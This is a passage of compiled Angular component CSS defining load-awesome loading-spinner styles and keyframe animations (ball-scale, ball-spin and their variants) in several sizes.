    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: .25s;
      animation-delay: .25s
    }

    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: .5s;
      animation-delay: .5s
    }

    .la-ball-scale-ripple-multiple.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-scale-ripple-multiple.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      border-width: 1px
    }

    .la-ball-scale-ripple-multiple.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-scale-ripple-multiple.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px;
      border-width: 4px
    }

    .la-ball-scale-ripple-multiple.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-scale-ripple-multiple.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px;
      border-width: 6px
    }

    @-webkit-keyframes ball-scale-ripple-multiple {
      0% {
        opacity: 1;
        transform: scale(.1)
      }

      70% {
        opacity: .5;
        transform: scale(1)
      }

      95% {
        opacity: 0
      }
    }

    @keyframes ball-scale-ripple-multiple {
      0% {
        opacity: 1;
        transform: scale(.1)
      }

      70% {
        opacity: .5;
        transform: scale(1)
      }

      95% {
        opacity: 0
      }
    }

    .la-ball-scale-ripple[_ngcontent-oeb-c134],
    .la-ball-scale-ripple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-scale-ripple[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-scale-ripple.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-scale-ripple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-scale-ripple[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-scale-ripple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px;
      background: transparent;
      border-width: 2px;
      border-radius: 100%;
      opacity: 0;
      -webkit-animation: ball-scale-ripple 1s cubic-bezier(.21, .53, .56, .8) 0s infinite;
      animation: ball-scale-ripple 1s cubic-bezier(.21, .53, .56, .8) 0s infinite
    }

    .la-ball-scale-ripple.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-scale-ripple.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      border-width: 1px
    }

    .la-ball-scale-ripple.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-scale-ripple.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px;
      border-width: 4px
    }

    .la-ball-scale-ripple.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-scale-ripple.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px;
      border-width: 6px
    }

    @-webkit-keyframes ball-scale-ripple {
      0% {
        opacity: 1;
        transform: scale(.1)
      }

      70% {
        opacity: .65;
        transform: scale(1)
      }

      to {
        opacity: 0
      }
    }

    @keyframes ball-scale-ripple {
      0% {
        opacity: 1;
        transform: scale(.1)
      }

      70% {
        opacity: .65;
        transform: scale(1)
      }

      to {
        opacity: 0
      }
    }

    .la-ball-scale[_ngcontent-oeb-c134],
    .la-ball-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-scale[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-scale.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-scale[_ngcontent-oeb-c134],
    .la-ball-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-radius: 100%;
      opacity: 0;
      -webkit-animation: ball-scale 1s ease-in-out 0s infinite;
      animation: ball-scale 1s ease-in-out 0s infinite
    }

    .la-ball-scale.la-sm[_ngcontent-oeb-c134],
    .la-ball-scale.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-scale.la-2x[_ngcontent-oeb-c134],
    .la-ball-scale.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-scale.la-3x[_ngcontent-oeb-c134],
    .la-ball-scale.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    @-webkit-keyframes ball-scale {
      0% {
        opacity: 1;
        transform: scale(0)
      }

      to {
        opacity: 0;
        transform: scale(1)
      }
    }

    @keyframes ball-scale {
      0% {
        opacity: 1;
        transform: scale(0)
      }

      to {
        opacity: 0;
        transform: scale(1)
      }
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134],
    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-spin-clockwise-fade-rotating.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px;
      -webkit-animation: ball-spin-clockwise-fade-rotating-rotate 6s linear infinite;
      animation: ball-spin-clockwise-fade-rotating-rotate 6s linear infinite
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 8px;
      height: 8px;
      margin-top: -4px;
      margin-left: -4px;
      border-radius: 100%;
      -webkit-animation: ball-spin-clockwise-fade-rotating 1s linear infinite;
      animation: ball-spin-clockwise-fade-rotating 1s linear infinite
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 5%;
      left: 50%;
      -webkit-animation-delay: -.875s;
      animation-delay: -.875s
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 18.1801948466%;
      left: 81.8198051534%;
      -webkit-animation-delay: -.75s;
      animation-delay: -.75s
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 95%;
      -webkit-animation-delay: -.625s;
      animation-delay: -.625s
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 81.8198051534%;
      left: 81.8198051534%;
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 94.9999999966%;
      left: 50.0000000005%;
      -webkit-animation-delay: -.375s;
      animation-delay: -.375s
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 81.8198046966%;
      left: 18.1801949248%;
      -webkit-animation-delay: -.25s;
      animation-delay: -.25s
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999750815%;
      left: 5.0000051215%;
      -webkit-animation-delay: -.125s;
      animation-delay: -.125s
    }

    .la-ball-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 18.179464974%;
      left: 18.1803700518%;
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-ball-spin-clockwise-fade-rotating.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-spin-clockwise-fade-rotating.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-spin-clockwise-fade-rotating.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-spin-clockwise-fade-rotating.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      margin-top: -8px;
      margin-left: -8px
    }

    .la-ball-spin-clockwise-fade-rotating.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-spin-clockwise-fade-rotating.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin-top: -12px;
      margin-left: -12px
    }

    @-webkit-keyframes ball-spin-clockwise-fade-rotating-rotate {
      to {
        transform: rotate(-1turn)
      }
    }

    @keyframes ball-spin-clockwise-fade-rotating-rotate {
      to {
        transform: rotate(-1turn)
      }
    }

    @-webkit-keyframes ball-spin-clockwise-fade-rotating {
      50% {
        opacity: .25;
        transform: scale(.5)
      }

      to {
        opacity: 1;
        transform: scale(1)
      }
    }

    @keyframes ball-spin-clockwise-fade-rotating {
      50% {
        opacity: .25;
        transform: scale(.5)
      }

      to {
        opacity: 1;
        transform: scale(1)
      }
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134],
    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-spin-clockwise-fade.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 8px;
      height: 8px;
      margin-top: -4px;
      margin-left: -4px;
      border-radius: 100%;
      -webkit-animation: ball-spin-clockwise-fade 1s linear infinite;
      animation: ball-spin-clockwise-fade 1s linear infinite
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 5%;
      left: 50%;
      -webkit-animation-delay: -.875s;
      animation-delay: -.875s
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 18.1801948466%;
      left: 81.8198051534%;
      -webkit-animation-delay: -.75s;
      animation-delay: -.75s
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 95%;
      -webkit-animation-delay: -.625s;
      animation-delay: -.625s
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 81.8198051534%;
      left: 81.8198051534%;
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 94.9999999966%;
      left: 50.0000000005%;
      -webkit-animation-delay: -.375s;
      animation-delay: -.375s
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 81.8198046966%;
      left: 18.1801949248%;
      -webkit-animation-delay: -.25s;
      animation-delay: -.25s
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999750815%;
      left: 5.0000051215%;
      -webkit-animation-delay: -.125s;
      animation-delay: -.125s
    }

    .la-ball-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 18.179464974%;
      left: 18.1803700518%;
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-ball-spin-clockwise-fade.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-spin-clockwise-fade.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-spin-clockwise-fade.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-spin-clockwise-fade.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      margin-top: -8px;
      margin-left: -8px
    }

    .la-ball-spin-clockwise-fade.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-spin-clockwise-fade.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin-top: -12px;
      margin-left: -12px
    }

    @-webkit-keyframes ball-spin-clockwise-fade {
      50% {
        opacity: .25;
        transform: scale(.5)
      }

      to {
        opacity: 1;
        transform: scale(1)
      }
    }

    @keyframes ball-spin-clockwise-fade {
      50% {
        opacity: .25;
        transform: scale(.5)
      }

      to {
        opacity: 1;
        transform: scale(1)
      }
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134],
    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-spin-clockwise.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 8px;
      height: 8px;
      margin-top: -4px;
      margin-left: -4px;
      border-radius: 100%;
      -webkit-animation: ball-spin-clockwise 1s ease-in-out infinite;
      animation: ball-spin-clockwise 1s ease-in-out infinite
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 5%;
      left: 50%;
      -webkit-animation-delay: -.875s;
      animation-delay: -.875s
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 18.1801948466%;
      left: 81.8198051534%;
      -webkit-animation-delay: -.75s;
      animation-delay: -.75s
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 95%;
      -webkit-animation-delay: -.625s;
      animation-delay: -.625s
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 81.8198051534%;
      left: 81.8198051534%;
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 94.9999999966%;
      left: 50.0000000005%;
      -webkit-animation-delay: -.375s;
      animation-delay: -.375s
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 81.8198046966%;
      left: 18.1801949248%;
      -webkit-animation-delay: -.25s;
      animation-delay: -.25s
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999750815%;
      left: 5.0000051215%;
      -webkit-animation-delay: -.125s;
      animation-delay: -.125s
    }

    .la-ball-spin-clockwise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 18.179464974%;
      left: 18.1803700518%;
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-ball-spin-clockwise.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-spin-clockwise.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-spin-clockwise.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-spin-clockwise.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      margin-top: -8px;
      margin-left: -8px
    }

    .la-ball-spin-clockwise.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-spin-clockwise.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin-top: -12px;
      margin-left: -12px
    }

    @-webkit-keyframes ball-spin-clockwise {

      0%,
      to {
        opacity: 1;
        transform: scale(1)
      }

      20% {
        opacity: 1
      }

      80% {
        opacity: 0;
        transform: scale(0)
      }
    }

    @keyframes ball-spin-clockwise {

      0%,
      to {
        opacity: 1;
        transform: scale(1)
      }

      20% {
        opacity: 1
      }

      80% {
        opacity: 0;
        transform: scale(0)
      }
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134],
    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-spin-fade-rotating.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px;
      -webkit-animation: ball-spin-fade-rotate 6s linear infinite;
      animation: ball-spin-fade-rotate 6s linear infinite
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 8px;
      height: 8px;
      margin-top: -4px;
      margin-left: -4px;
      border-radius: 100%;
      -webkit-animation: ball-spin-fade 1s linear infinite;
      animation: ball-spin-fade 1s linear infinite
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 5%;
      left: 50%;
      -webkit-animation-delay: -1.125s;
      animation-delay: -1.125s
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 18.1801948466%;
      left: 81.8198051534%;
      -webkit-animation-delay: -1.25s;
      animation-delay: -1.25s
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 95%;
      -webkit-animation-delay: -1.375s;
      animation-delay: -1.375s
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 81.8198051534%;
      left: 81.8198051534%;
      -webkit-animation-delay: -1.5s;
      animation-delay: -1.5s
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 94.9999999966%;
      left: 50.0000000005%;
      -webkit-animation-delay: -1.625s;
      animation-delay: -1.625s
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 81.8198046966%;
      left: 18.1801949248%;
      -webkit-animation-delay: -1.75s;
      animation-delay: -1.75s
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999750815%;
      left: 5.0000051215%;
      -webkit-animation-delay: -1.875s;
      animation-delay: -1.875s
    }

    .la-ball-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 18.179464974%;
      left: 18.1803700518%;
      -webkit-animation-delay: -2s;
      animation-delay: -2s
    }

    .la-ball-spin-fade-rotating.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-spin-fade-rotating.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-spin-fade-rotating.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-spin-fade-rotating.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      margin-top: -8px;
      margin-left: -8px
    }

    .la-ball-spin-fade-rotating.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-spin-fade-rotating.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin-top: -12px;
      margin-left: -12px
    }

    @-webkit-keyframes ball-spin-fade-rotate {
      to {
        transform: rotate(1turn)
      }
    }

    @keyframes ball-spin-fade-rotate {
      to {
        transform: rotate(1turn)
      }
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134],
    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-spin-fade.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 8px;
      height: 8px;
      margin-top: -4px;
      margin-left: -4px;
      border-radius: 100%;
      -webkit-animation: ball-spin-fade 1s linear infinite;
      animation: ball-spin-fade 1s linear infinite
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 5%;
      left: 50%;
      -webkit-animation-delay: -1.125s;
      animation-delay: -1.125s
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 18.1801948466%;
      left: 81.8198051534%;
      -webkit-animation-delay: -1.25s;
      animation-delay: -1.25s
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 95%;
      -webkit-animation-delay: -1.375s;
      animation-delay: -1.375s
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 81.8198051534%;
      left: 81.8198051534%;
      -webkit-animation-delay: -1.5s;
      animation-delay: -1.5s
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 94.9999999966%;
      left: 50.0000000005%;
      -webkit-animation-delay: -1.625s;
      animation-delay: -1.625s
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 81.8198046966%;
      left: 18.1801949248%;
      -webkit-animation-delay: -1.75s;
      animation-delay: -1.75s
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999750815%;
      left: 5.0000051215%;
      -webkit-animation-delay: -1.875s;
      animation-delay: -1.875s
    }

    .la-ball-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 18.179464974%;
      left: 18.1803700518%;
      -webkit-animation-delay: -2s;
      animation-delay: -2s
    }

    .la-ball-spin-fade.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-spin-fade.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-spin-fade.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-spin-fade.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      margin-top: -8px;
      margin-left: -8px
    }

    .la-ball-spin-fade.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-spin-fade.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin-top: -12px;
      margin-left: -12px
    }

    @-webkit-keyframes ball-spin-fade {

      0%,
      to {
        opacity: 1;
        transform: scale(1)
      }

      50% {
        opacity: .25;
        transform: scale(.5)
      }
    }

    @keyframes ball-spin-fade {

      0%,
      to {
        opacity: 1;
        transform: scale(1)
      }

      50% {
        opacity: .25;
        transform: scale(.5)
      }
    }

    .la-ball-spin-rotate[_ngcontent-oeb-c134],
    .la-ball-spin-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-spin-rotate[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-spin-rotate.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-spin-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-spin-rotate[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px;
      -webkit-animation: ball-spin-rotate 2s linear infinite;
      animation: ball-spin-rotate 2s linear infinite
    }

    .la-ball-spin-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 0;
      width: 60%;
      height: 60%;
      border-radius: 100%;
      -webkit-animation: ball-spin-bounce 2s ease-in-out infinite;
      animation: ball-spin-bounce 2s ease-in-out infinite
    }

    .la-ball-spin-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      top: auto;
      bottom: 0;
      -webkit-animation-delay: -1s;
      animation-delay: -1s
    }

    .la-ball-spin-rotate.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-spin-rotate.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-spin-rotate.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    @-webkit-keyframes ball-spin-rotate {
      to {
        transform: rotate(1turn)
      }
    }

    @keyframes ball-spin-rotate {
      to {
        transform: rotate(1turn)
      }
    }

    @-webkit-keyframes ball-spin-bounce {

      0%,
      to {
        transform: scale(0)
      }

      50% {
        transform: scale(1)
      }
    }

    @keyframes ball-spin-bounce {

      0%,
      to {
        transform: scale(0)
      }

      50% {
        transform: scale(1)
      }
    }

    .la-ball-spin[_ngcontent-oeb-c134],
    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-spin[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-spin.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-spin[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 8px;
      height: 8px;
      margin-top: -4px;
      margin-left: -4px;
      border-radius: 100%;
      -webkit-animation: ball-spin 1s ease-in-out infinite;
      animation: ball-spin 1s ease-in-out infinite
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 5%;
      left: 50%;
      -webkit-animation-delay: -1.125s;
      animation-delay: -1.125s
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 18.1801948466%;
      left: 81.8198051534%;
      -webkit-animation-delay: -1.25s;
      animation-delay: -1.25s
    }

